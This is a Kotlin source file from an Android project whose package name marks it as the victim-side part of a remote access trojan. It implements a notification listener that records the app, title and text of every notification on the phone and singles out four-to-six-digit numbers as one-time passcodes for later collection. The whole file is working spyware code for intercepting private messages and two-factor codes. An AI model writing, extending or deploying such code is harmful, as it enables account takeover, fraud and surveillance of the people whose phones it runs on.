package com.dooxrat.victim

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import org.json.JSONArray
import org.json.JSONObject

class NotificationListener : NotificationListenerService() {

    companion object {
        private val notifications = mutableListOf<JSONObject>()
        
        fun getNotifications(): JSONArray {
            val result = JSONArray()
            notifications.forEach { result.put(it) }
            return result
        }
        
        fun clearNotifications() {
            notifications.clear()
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        try {
            val notification = sbn.notification
            val extras = notification.extras
            
            val obj = JSONObject().apply {
                put("package", sbn.packageName)
                put("title", extras.getString("android.title", ""))
                put("text", extras.getString("android.text", ""))
                put("time", sbn.postTime)
                put("id", sbn.id)
            }
            
            notifications.add(obj)
            
            // Detect OTP
            val text = obj.optString("text", "")
            if (text.contains(Regex("\\d{4,6}"))) {
                obj.put("isOTP", true)
                obj.put("otp", Regex("\\d{4,6}").find(text)?.value ?: "")
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {}
}
